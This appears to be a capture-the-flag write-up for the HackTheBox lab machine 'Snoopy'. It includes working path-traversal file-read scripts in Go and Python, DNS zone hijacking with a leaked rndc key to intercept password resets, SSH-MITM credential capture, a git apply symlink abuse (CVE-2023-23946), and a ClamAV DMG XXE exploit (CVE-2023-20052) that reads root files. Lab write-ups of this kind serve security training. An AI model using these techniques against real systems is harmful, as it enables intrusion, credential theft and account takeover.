![snoopy.png](snoopy.png)  

# Snoopy

## Enum
```bash
nmap -Pn -sC -sV 10.10.11.212 -oN scans/nmap.initial
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-21 22:17 IST
Nmap scan report for 10.10.11.212
Host is up (0.043s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 ee:6b:ce:c5:b6:e3:fa:1b:97:c0:3d:5f:e3:f1:a1:6e (ECDSA)
|_  256 54:59:41:e1:71:9a:1a:87:9c:1e:99:50:59:bf:e5:ba (ED25519)
53/tcp open  domain  ISC BIND 9.18.12-0ubuntu0.22.04.1 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.18.12-0ubuntu0.22.04.1-Ubuntu
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: SnoopySec Bootstrap Template - Index
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.59 seconds
```
```bash
dirsearch -u http://10.10.11.212

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/blnkn/.dirsearch/reports/10.10.11.212/_23-07-21_22-19-59.txt

Error Log: /home/blnkn/.dirsearch/logs/errors-23-07-21_22-19-59.log

Target: http://10.10.11.212/

[22:19:59] Starting:
[22:20:06] 200 -   16KB - /about.html
[22:20:10] 403 -  564B  - /assets/
[22:20:10] 301 -  178B  - /assets  ->  http://10.10.11.212/assets/
[22:20:12] 200 -   10KB - /contact.html
[22:20:15] 301 -  178B  - /forms  ->  http://10.10.11.212/forms/
[22:20:17] 200 -   23KB - /index.html
[22:21:57] 200 -   11MB - /download
[22:21:58] 200 -   11MB - /download.php

Task Completed

```
```
ffuf \
  -c \
  -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt \
  -u "http://snoopy.htb" \
  -H "Host: FUZZ.snoopy.htb" -mc all -fs 23418

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://snoopy.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt
 :: Header           : Host: FUZZ.snoopy.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 23418
________________________________________________

[Status: 200, Size: 3132, Words: 141, Lines: 1, Duration: 46ms]
    * FUZZ: mm
```
```bash
grep sh $ passwd
grep: $: No such file or directory
passwd:root:x:0:0:root:/root:/bin/bash
passwd:sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
passwd:cbrown:x:1000:1000:Charlie Brown:/home/cbrown:/bin/bash
passwd:sbrown:x:1001:1001:Sally Brown:/home/sbrown:/bin/bash
passwd:lpelt:x:1003:1004::/home/lpelt:/bin/bash
passwd:cschultz:x:1004:1005:Charles Schultz:/home/cschultz:/bin/bash
passwd:vgray:x:1005:1006:Violet Gray:/home/vgray:/bin/bash
```
```bash
dig AXFR snoopy.htb @10.10.11.212

; <<>> DiG 9.18.16-1-Debian <<>> AXFR snoopy.htb @10.10.11.212
;; global options: +cmd
snoopy.htb.             86400   IN      SOA     ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400
snoopy.htb.             86400   IN      NS      ns1.snoopy.htb.
snoopy.htb.             86400   IN      NS      ns2.snoopy.htb.
mattermost.snoopy.htb.  86400   IN      A       172.18.0.3
mm.snoopy.htb.          86400   IN      A       127.0.0.1
ns1.snoopy.htb.         86400   IN      A       10.0.50.10
ns2.snoopy.htb.         86400   IN      A       10.0.51.10
postgres.snoopy.htb.    86400   IN      A       172.18.0.2
provisions.snoopy.htb.  86400   IN      A       172.18.0.4
www.snoopy.htb.         86400   IN      A       127.0.0.1
snoopy.htb.             86400   IN      SOA     ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400
;; Query time: 140 msec
;; SERVER: 10.10.11.212#53(10.10.11.212) (TCP)
;; WHEN: Fri Jul 21 22:52:05 IST 2023
;; XFR size: 11 records (messages 1, bytes 325)
```

## Arbitrary file read

Found this on the internet
```go
package main

import (
        "archive/zip"
        "fmt"
        "io"
        "net/http"
        "net/url"
        "os"
)

func checkError(err error) {
        if err != nil {
                return
        }
}

func main() {
        var URL string = "http://snoopy.htb"
        var Resource string = "/download"
        params := url.Values{}

        var Payload string
        fmt.Printf("Enter file location: ")
        fmt.Scanf("%v", &Payload)

        params.Add("file", fmt.Sprintf("....//....//....//....//....//....//....//....//....//....//....//..../%v", Payload))

        buildUrl, _ := url.Parse(URL)
        buildUrl.Path = Resource
        buildUrl.RawQuery = params.Encode()

        urlStr := fmt.Sprintf("%v", buildUrl)

        res, err := http.Get(urlStr)
        checkError(err)

        defer res.Body.Close()
        body, err := io.ReadAll(res.Body)

        if err := os.WriteFile("test.zip", body, 0644); err != nil {
                return
        }

        unzipData, err := zip.OpenReader("test.zip")
        checkError(err)
        defer unzipData.Close()

        for _, file := range unzipData.File {
                optReader, err := file.Open()
                checkError(err)
                defer optReader.Close()

                opt, err := io.ReadAll(optReader)
                checkError(err)

                fmt.Printf(string(opt))
        }

}
```

Trying to go throught the process manually, because of the scan we know that the download page for the press release is php, so, maybe we can try to see how it responds with different url params
```bash
curl -O 'http://10.10.11.212/download.php'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 10.8M  100 10.8M    0     0   982k      0  0:00:11  0:00:11 --:--:-- 2532k

curl -O 'http://10.10.11.212/download.php?id=/etc/passwd'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 10.8M  100 10.8M    0     0  3579k      0  0:00:03  0:00:03 --:--:-- 3579k

curl -O 'http://10.10.11.212/download.php?name=/etc/passwd'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 10.8M  100 10.8M    0     0  2869k      0  0:00:03  0:00:03 --:--:-- 2868k

curl -O 'http://10.10.11.212/download.php?file=/etc/passwd'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
```

If provided with an incorrect param it will just return the same as when not provided with a param, that's the press release package. But when provided with the `file` param we get a different response, the response is empty though, so, maybe the logic triggered here is doing some basic path traversal filtering. If we just do the basic evasion from the aforementionned go code we should get data.
```bash
curl -O 'http://10.10.11.212/download.php?file=....//....//....//....//....//etc/passwd'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   796  100   796    0     0  10947      0 --:--:-- --:--:-- --:--:-- 11055
```

```bash
unzip download.php
Archive:  download.php
  inflating: press_package/etc/passwd
```

```bash
tree .
.
├── download.php
└── press_package
    └── etc
        └── passwd

3 directories, 2 files
```

Let try to script that out ourselves in python
```bash
import requests
import zipfile
import click
import io


def get_archive(target: str) -> bytes:
    path = f"....//....//....//....//..../{target}"
    param = f"file={path}"
    url = f"http://snoopy.htb/download.php?{param}"
    res = requests.get(url)
    return res.content


def decompress_archive(data: bytes) -> str:
    with io.BytesIO() as buf:
        buf.write(data)
        buf.seek(0)
        with zipfile.ZipFile(buf, mode="r") as archive:
            filename = archive.namelist()[0]
            file = archive.read(filename)
    return file.decode()


@click.command()
@click.option('--file', '-f', help='File to fetch')
def main(file: str) -> None:
    archive = get_archive(file)
    file = decompress_archive(archive)
    click.echo(file)


if __name__ == "__main__":
    main()
```

```bash
python3 read.py -f /etc/passwd|grep sh$
root:x:0:0:root:/root:/bin/bash
cbrown:x:1000:1000:Charlie Brown:/home/cbrown:/bin/bash
sbrown:x:1001:1001:Sally Brown:/home/sbrown:/bin/bash
lpelt:x:1003:1004::/home/lpelt:/bin/bash
cschultz:x:1004:1005:Charles Schultz:/home/cschultz:/bin/bash
vgray:x:1005:1006:Violet Gray:/home/vgray:/bin/bash
```

```bash
python3 read.py -f /etc/nginx/nginx.conf
user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;

events {
    worker_connections 768;
    # multi_accept on;
}

http {

    ##
    # Basic Settings
    ##

    sendfile on;
    tcp_nopush on;
    types_hash_max_size 2048;
    # server_tokens off;

    # server_names_hash_bucket_size 64;
    # server_name_in_redirect off;

    include /etc/nginx/mime.types;
    default_type application/octet-stream;

    ##
    # SSL Settings
    ##

    ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # Dropping SSLv3, ref: POODLE
    ssl_prefer_server_ciphers on;

    ##
    # Logging Settings
    ##

    access_log /var/log/nginx/access.log;
    error_log /var/log/nginx/error.log;

    ##
    # Gzip Settings
    ##

    gzip on;

    # gzip_vary on;
    # gzip_proxied any;
    # gzip_comp_level 6;
    # gzip_buffers 16 8k;
    # gzip_http_version 1.1;
    # gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;

    ##
    # Virtual Host Configs
    ##

    include /etc/nginx/conf.d/*.conf;
    include /etc/nginx/sites-enabled/*;
}


#mail {
#   # See sample authentication script at:
#   # http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript
#
#   # auth_http localhost/auth.php;
#   # pop3_capabilities "TOP" "USER";
#   # imap_capabilities "IMAP4rev1" "UIDPLUS";
#
#   server {
#       listen     localhost:110;
#       protocol   pop3;
#       proxy      on;
#   }
#
#   server {
#       listen     localhost:143;
#       protocol   imap;
#       proxy      on;
#   }
#}
```

```bash
read.py -f /etc/nginx/sites-enabled/default
##
# You should look at the following URL's in order to grasp a solid understanding
# of Nginx configuration files in order to fully unleash the power of Nginx.
# https://www.nginx.com/resources/wiki/start/
# https://www.nginx.com/resources/wiki/start/topics/tutorials/config_pitfalls/
# https://wiki.debian.org/Nginx/DirectoryStructure
#
# In most cases, administrators will remove this file from sites-enabled/ and
# leave it as reference inside of sites-available where it will continue to be
# updated by the nginx packaging team.
#
# This file will automatically load configuration files provided by other
# applications, such as Drupal or Wordpress. These applications will be made
# available underneath a path with that package name, such as /drupal8.
#
# Please see /usr/share/doc/nginx-doc/examples/ for more detailed examples.
##

# Default server configuration
#
server {
        listen 80 default_server;
        listen [::]:80 default_server;

        # SSL configuration
        #
        # listen 443 ssl default_server;
        # listen [::]:443 ssl default_server;
        #
        # Note: You should disable gzip for SSL traffic.
        # See: https://bugs.debian.org/773332
        #
        # Read up on ssl_ciphers to ensure a secure configuration.
        # See: https://bugs.debian.org/765782
        #
        # Self signed certs generated by the ssl-cert package
        # Don't use them in a production server!
        #
        # include snippets/snakeoil.conf;

        root /var/www/html;

        # Add index.php to the list if you are using PHP
        index index.html index.htm index.nginx-debian.html;

        server_name _;

        location / {
                # First attempt to serve request as file, then
                # as directory, then fall back to displaying a 404.
                try_files $uri $uri/ =404;
        }

        location ~ ^/download$ {
                alias /var/www/html/download.php;
                fastcgi_pass unix:/var/run/php/php8.1-fpm.sock;
                fastcgi_param SCRIPT_FILENAME $request_filename;
                include fastcgi_params;
        }

        location ~ \.php$ {
                include fastcgi_params;
                fastcgi_pass unix:/run/php/php8.1-fpm.sock;
                fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        }

        # pass PHP scripts to FastCGI server
        #
        #location ~ \.php$ {
        #       include snippets/fastcgi-php.conf;
        #
        #       # With php-fpm (or other unix sockets):
        #       fastcgi_pass unix:/run/php/php7.4-fpm.sock;
        #       # With php-cgi (or other tcp sockets):
        #       fastcgi_pass 127.0.0.1:9000;
        #}

        # deny access to .htaccess files, if Apache's document root
        # concurs with nginx's one
        #
        #location ~ /\.ht {
        #       deny all;
        #}
}


# Virtual Host configuration for example.com
#
# You can move that to a different file under sites-available/ and symlink that
# to sites-enabled/ to enable it.
#
#server {
#       listen 80;
#       listen [::]:80;
#
#       server_name example.com;
#
#       root /var/www/example.com;
#       index index.html;
#
#       location / {
#               try_files $uri $uri/ =404;
#       }
#}
```

This is what we just exploited
```bash
python3 read.py -f /var/www/html/download.php
```
```php
<?php

$file = $_GET['file'];
$dir = 'press_package/';
$archive = tempnam(sys_get_temp_dir(), 'archive');
$zip = new ZipArchive();
$zip->open($archive, ZipArchive::CREATE);

if (isset($file)) {
        $content = preg_replace('/\.\.\//', '', $file);
        $filecontent = $dir . $content;
        if (file_exists($filecontent)) {
            if ($filecontent !== '.' && $filecontent !== '..') {
                $content = preg_replace('/\.\.\//', '', $filecontent);
                $zip->addFile($filecontent, $content);
            }
        }
} else {
        $files = scandir($dir);
        foreach ($files as $file) {
                if ($file !== '.' && $file !== '..') {
                        $zip->addFile($dir . '/' . $file, $file);
                }
        }
}

$zip->close();
header('Content-Type: application/zip');
header("Content-Disposition: attachment; filename=press_release.zip");
header('Content-Length: ' . filesize($archive));

readfile($archive);
unlink($archive);

?>
```

Persumably the dns server is bind.
```bash
dig +short version.bind CHAOS TXT @10.10.11.212
"9.18.12-0ubuntu0.22.04.1-Ubuntu"
```

So the configuration file for it should be here:
```bash
python3 read.py -f /etc/bind/named.conf
// This is the primary configuration file for the BIND DNS server named.
//
// Please read /usr/share/doc/bind9/README.Debian.gz for information on the
// structure of BIND configuration files in Debian, *BEFORE* you customize
// this configuration file.
//
// If you are just adding zones, please do that in /etc/bind/named.conf.local

include "/etc/bind/named.conf.options";
include "/etc/bind/named.conf.local";
include "/etc/bind/named.conf.default-zones";

key "rndc-key" {
    algorithm hmac-sha256;
    secret "BEqUtce*************************************";
};
```


## Exploiting Bind DNS

Because we have the hmac sha, we can authenticate to the DNS server to make DNS record changes.  
And we have access to the password reset page in the mattermost instance, which sends password reset requests to users emails, so, we can highjack the mail server address, and reset people's passwords
```bash
cat commands
server 10.10.11.212 53
key hmac-sha256:rndc-key BEqUtce*************************************
zone snoopy.htb
update add mail.snoopy.htb 86400 A 10.10.14.218
send
quit
```
```bash
nsupdate commands
```
```bash
dig +short mail.snoopy.htb @10.10.11.212
10.10.14.218
```
```bash
python3 -m smtpd -c DebuggingServer -n 10.10.14.218:25
/home/blnkn/.pyenv/versions/3.10.0/lib/python3.10/smtpd.py:104: DeprecationWarning: The asyncore module is deprecated. The recommended replacement is asyncio
  import asyncore
/home/blnkn/.pyenv/versions/3.10.0/lib/python3.10/smtpd.py:105: DeprecationWarning: The asynchat module is deprecated. The recommended replacement is asyncio
  import asynchat
---------- MESSAGE FOLLOWS ----------
mail options: ['BODY=8BITMIME']
b'MIME-Version: 1.0'
b'Precedence: bulk'
b'Reply-To: "No-Reply" <no-reply@snoopy.htb>'
b'Message-ID: <b9pkjm7qh3j73ssg-1689978382@mm.snoopy.htb>'
b'Auto-Submitted: auto-generated'
b'Date: Fri, 21 Jul 2023 22:26:22 +0000'
b'From: "No-Reply" <no-reply@snoopy.htb>'
b'To: cschultz@snoopy.htb'
b'Subject: [Mattermost] Reset your password'
b'Content-Transfer-Encoding: 8bit'
b'Content-Type: multipart/alternative;'
b' boundary=c09f962afb7f4dbacef4dde1e9f23bddc911a2a68839924017c873cee4f4'
b'X-Peer: 10.10.11.212'
b''
b'--c09f962afb7f4dbacef4dde1e9f23bddc911a2a68839924017c873cee4f4'
b'Content-Transfer-Encoding: quoted-printable'
b'Content-Type: text/plain; charset=UTF-8'
b''
b'Reset Your Password'
b'Click the button below to reset your password. If you didn=E2=80=99t reques='
b't this, you can safely ignore this email.'
b''
b'Reset Password ( http://mm.snoopy.htb/reset_password_complete?token=3Dcrigo='
b'topdsd9iczhx5xhitypt4wwqnqsduz4fhmuet4c7tbqmwka95jfjwyaw8nh )'
b''
```
```
http://mm.snoopy.htb/reset_password_complete?token=3Dcrigo=topdsd9iczhx5xhitypt4wwqnqsduz4fhmuet4c7tbqmwka95jfjwyaw8nh
```
removed the 3d and the =
```
http://mm.snoopy.htb/reset_password_complete?token=7919jpuw858nosbwznddtjkyeg99zwkg4pxqpw9ybtpjxkf6cuqmkq7gdia77kdx
```



## SSH MITM

Looking through the chats on the mattermost instance, there is this `server_provision` slash command available, which will trigger a connection to the server with a user's credentials, and we control the address of the server, so same concept as before, we can just man in the middle that to steal the password.

![provision.png](provision.png)  
```bash
ssh-mitm server --remote-host snoopy.htb --listen-port 2222
───────────────────────────────── SSH-MITM - ssh audits made simple ─────────────────────────────────
Version: 3.0.2
License: GNU General Public License v3.0
Documentation: https://docs.ssh-mitm.at
Issues: https://github.com/ssh-mitm/ssh-mitm/issues
─────────────────────────────────────────────────────────────────────────────────────────────────────
generated temporary RSAKey key with 2048 bit length and fingerprints:
   MD5:d5:88:ea:14:0f:e3:46:28:c1:25:43:1b:b2:80:75:f1
   SHA256:elkNMTo5YyqyJuZJJfJxnNkUrmWyCqGvv5zwwUg5Rto
   SHA512:fpLNhFUAr0Nec/ieRcwbJdh0+Rajj2PDE3Sj8IWC4mKRyQeL1GQr+TvqatBBPM8IRkTNTUFTTauUSDzwTNbUPQ
listen interfaces 0.0.0.0 and :: on port 2222
────────────────────────────────────── waiting for connections ──────────────────────────────────────
[07/22/23 10:56:33] INFO     ℹ session 23cd65a9-fcc0-40db-b93e-6f853a633b6b created
                    INFO     ℹ client information:
                               - client version: ssh-2.0-paramiko_3.1.0
                               - product name: Paramiko
                               - vendor url:  https://www.paramiko.org/
                             ⚠ client audit tests:
                               * client uses same server_host_key_algorithms list for unknown and
                             known hosts
                               * Preferred server host key algorithm: ssh-ed25519
[07/22/23 10:56:34] INFO     Remote authentication succeeded
                                     Remote Address: snoopy.htb:22
                                     Username: cbrown
                                     Password: sn00ped*************
                                     Agent: no agent
                    INFO     ℹ 23cd65a9-fcc0-40db-b93e-6f853a633b6b - local port
                             forwading
                             SOCKS port: 36593
                               SOCKS4:
                                 * socat: socat TCP-LISTEN:LISTEN_PORT,fork
                             socks4:127.0.0.1:DESTINATION_ADDR:DESTINATION_PORT,socksport=36593
                                 * netcat: nc -X 4 -x localhost:36593 address port
                               SOCKS5:
                                 * netcat: nc -X 5 -x localhost:36593 address port
                    INFO     got ssh command: ls -la
[07/22/23 10:56:35] INFO     ℹ 23cd65a9-fcc0-40db-b93e-6f853a633b6b - session started
                    INFO     got remote command: ls -la
                    INFO     remote command 'ls -la' exited with code: 0
                    ERROR    Socket exception: Connection reset by peer (104)
                    INFO     ℹ session 23cd65a9-fcc0-40db-b93e-6f853a633b6b closed
```
```bash
cbrown@snoopy:~$ id
uid=1000(cbrown) gid=1000(cbrown) groups=1000(cbrown),1002(devops)
```

## Lateral movement through git apply (CVE-2023-23946)

```bash
cbrown@snoopy:~$ sudo -l
[sudo] password for cbrown:
Sorry, try again.
[sudo] password for cbrown:
Matching Defaults entries for cbrown on snoopy:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User cbrown may run the following commands on snoopy:
    (sbrown) PASSWD: /usr/bin/git ^apply -v [a-zA-Z0-9.]+$
```

Git allows for applying arbitrary patches to your repository’s history with git apply. In order to prevent malicious patches from creating files outside of the working copy, git apply rejects patches which attempt to write a file beyond a symbolic link.

However, this mechanism can be tricked when the malicious patch creates that symbolic link in the first place. This can be leveraged to write arbitrary files on a victim’s filesystem when applying malicious patches from untrusted sources.

```bash
cbrown@snoopy:~/repo$ find / -user sbrown 2>/dev/null
/home/sbrown
/home/cbrown/repo/mio2
/home/cbrown/repo/mio2/authorized_keys
```
```bash
cat addkey
diff --git a/mio2/authorized_keys b/mio2/authorized_keys
index 05a08d6..d984dab 100644
--- a/mio2/authorized_keys
+++ b/mio2/authorized_keys
@@ -1 +1,3 @@
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCp2In5V5cm8cGkJL+iPcT6CmRu/LBS6qjTFryVEtNSvCe4vME2yUiqU4kfuUXf/tI3g3YWfRJO5O5PAxZSW9ssXtRU3R47KcDXffccwYLtKhNTcRr+pbXvMpfhxJPfRlM3Ug09Yv/NxknO4QHE9ylqo4/CvmzB+hhyLYt2qHR0CYR2x494UQ5CtNJ4tku9NVxAxcyEgG3dt5FPvybHILfC5iZLpZdI5+AbRH6Y6JUqNswBRd9CR7GlYDVM/FdFQudCrWiFWFfOI3RHxZQ032ehrzQUVh+XOrIwOo6Yi6qO5wXSWowQ5m6CJyKErP64gtK50nw6Rg4cwCno2XDMT4Gww/u4YpnC+zVMW1jnqsE//Y5OyY5Csbb2rss4Kg90Pe9bV/LF534ZtXOBt9TSNCH3incE1ZGnbnLg0/4wCTa0xFzCTrMgGiULp28pT/Mng0bqQdIx7Ecog5uq6auEyaVSl++mqetv2yHa1UDxTfh1qjc+X2RDcVWE17M6QCXo4A4q9SOiwiFk50wldvCc4w12FoyyZwIL0hLxK4hIzcrBU0x/RAUknJHCricwHJJXVfPyj83HioQIEPiezbTfoEEVWq6CApKhQoDiKrveWkjLVoiFPHiuXoGuDxhMhlQfVW6DZRrsqUTzOdlSxAUGDKDb+02ff/G5RCMmZd4X3vjBPw== sbrown@snoopy.htb
+
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDNO5SP8lnlQVttOUf1a+dnSOLuErARU0EjxZsBVy1vdxep2xOMiGVuX9cDBAABoVTmEJw52Giii9qgtQZ2yHWa1vi1SmgyFZtF+A8Aer9+TO+T2XA9uhXiLtJW/mkyKJabX1Fxgjn6T5myorx3pZzvyxGgizxT4CZKR6AqhU6kI3LGYT7XzNpyVo0qyQ0OAa4y30DK3Wnalod/2yREUIooYn1D0lbBNyN1RqAPQu7+bE8U1ZxVD8S1+60YsGCYypyb/AVe3OZYVdHcU0LqdoaD3MUB8oeLRp4pkWIsRq/LdAN37j8N6J98ff2w29ixFR40m1YcgRAUYG1E0bb1dXoKm2umPxjcbl68DI6T9SWeIYIfoO/+xTPYsDMx6peID4HEMp1P/gbZR9elkS+oOaSy/K4Wn0V0WNrjb6D0xD98HqGruxLs3NZGMhPbcd/mYD+opVabS/4sbfWJNaBe7BiGoCczFvXeFRMvDuoMCRvMrpkvQwHp7wUudRuoAqDU+Ok= blnkn@Kolossus
```
```bash
sudo -u sbrown git apply -v addkey
Checking patch mio2/authorized_keys...
Applied patch mio2/authorized_keys cleanly.
```

And we we are now sbrown
```bash
cbrown@snoopy:~$ ssh sbrown@127.0.0.1
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-71-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sat Aug 12 11:57:14 2023 from 127.0.0.1
sbrown@snoopy:~$ id
uid=1001(sbrown) gid=1001(sbrown) groups=1001(sbrown),1002(devops)
```

## ClamAV file disclosure

```bash
sbrown@snoopy:~$ sudo -l
Matching Defaults entries for sbrown on snoopy:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH
    XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User sbrown may run the following commands on snoopy:
    (root) NOPASSWD: /usr/local/bin/clamscan ^--debug /home/sbrown/scanfiles/[a-zA-Z0-9.]+$
```
[https://docs.clamav.net/manual/Signatures/ExtendedSignatures.html](https://docs.clamav.net/manual/Signatures/ExtendedSignatures.html)  

I went on a rabbit hole trying to match private keys with custom clamav rules using extended signatures as descibed in the documentation above
```bash
printf '-----BEGIN OPENSSH PRIVATE KEY-----'|xxd
00000000: 2d2d 2d2d 2d42 4547 494e 204f 5045 4e53  -----BEGIN OPENS
00000010: 5348 2050 5249 5641 5445 204b 4559 2d2d  SH PRIVATE KEY--
00000020: 2d2d 2d                                  ---
```

Testing this on my own machine
```bash
pwd
/var/lib/clamav
```
```bash
cat priv.ndb
PRIV:0:*:2d2d2d2d2d424547494e204f50454e5353482050524956415445204b45592d2d2d2d2d
```
```bash
clamscan ~/.ssh
Loading:     9s, ETA:   0s [========================>]    8.67M/8.67M sigs
Compiling:   2s, ETA:   0s [========================>]       41/41 tasks

/home/blnkn/.ssh/amd64: PRIV.UNOFFICIAL FOUND
/home/blnkn/.ssh/ldapreferer.pem: OK
/home/blnkn/.ssh/kvm.pub: OK
/home/blnkn/.ssh/key.pub: OK
/home/blnkn/.ssh/amd64.pem: PRIV.UNOFFICIAL FOUND
/home/blnkn/.ssh/id_rsa: PRIV.UNOFFICIAL FOUND
/home/blnkn/.ssh/key: PRIV.UNOFFICIAL FOUND
/home/blnkn/.ssh/kvm: PRIV.UNOFFICIAL FOUND
/home/blnkn/.ssh/known_hosts: OK
/home/blnkn/.ssh/do: PRIV.UNOFFICIAL FOUND
/home/blnkn/.ssh/1xA10.pem: OK
/home/blnkn/.ssh/open-vpn-london.pem: PRIV.UNOFFICIAL FOUND
/home/blnkn/.ssh/known_hosts.old: OK
/home/blnkn/.ssh/authorized_keys: OK
/home/blnkn/.ssh/id_rsa.pub: OK
/home/blnkn/.ssh/squid-proxy-london.pem: PRIV.UNOFFICIAL FOUND
/home/blnkn/.ssh/priv.ndb: OK

----------- SCAN SUMMARY -----------
Known viruses: 8671731
Engine version: 1.0.1
Scanned directories: 1
Scanned files: 17
Infected files: 8
Data scanned: 0.05 MB
Data read: 0.02 MB (ratio 2.00:1)
Time: 11.218 sec (0 m 11 s)
Start Date: 2023:08:12 14:55:28
End Date:   2023:08:12 14:55:40
```

It works, but we don't have really have a way to leverage that on the remote machine because of the strict regex on the sudo command. We could probably successfully match the file by using a symlink on the path we control to `/root/id_rsa` but again, because of the strict regex validation, we can't leverage that to copy the infected files over with the `--copy` flag... Back to the drawing board

[CVE-2023-20052](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-clamav-xxe-TcSZduhN) affects clamav =< 1.0.0
```bash
clamscan --version
ClamAV 1.0.0/26853/Fri Mar 24 07:24:11 2023
```
Found a PoC for it:  
[https://github.com/nokn0wthing/CVE-2023-20052](https://github.com/nokn0wthing/CVE-2023-20052)  
```bash
docker run -v $(pwd):/exploit -it cve-2023-20052 bash
```
```bash
root@f6cb73afbeb4:/exploit# genisoimage -D -V "exploit" -no-pad -r -apple -file-mode 0777 -o test.img . && dmg dmg test.img test.dmg
bbe -e 's|<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">|<!DOCTYPE plist [<!ENTITY xxe SYSTEM "/root/root.txt"> ]>|' -e 's/blkx/&xxe\;/' test.dmg -o exploit.dmg
genisoimage: Warning: no Apple/Unix files will be decoded/mapped
Total translation table size: 0
Total rockridge attributes bytes: 7069
Total directory bytes: 38180
Path table size(bytes): 240
Max brk space used 23000
362 extents written (0 MB)
Processing DDM...
No DDM! Just doing one huge blkx then...
run 0: sectors=512, left=1448
run 1: sectors=512, left=936
run 2: sectors=424, left=424
Writing XML data...
Generating UDIF metadata...
Master checksum: a1ba5595
Writing out UDIF resource file...
Cleaning up...
Done
```

Moving the .dmg over to the scan folder in the box and running clamscan, the XXE is triggered successfully and we can read files as root
```bash
LibClamAV debug: cli_scandmg: wanted blkx, text value is 9b94****************************
```
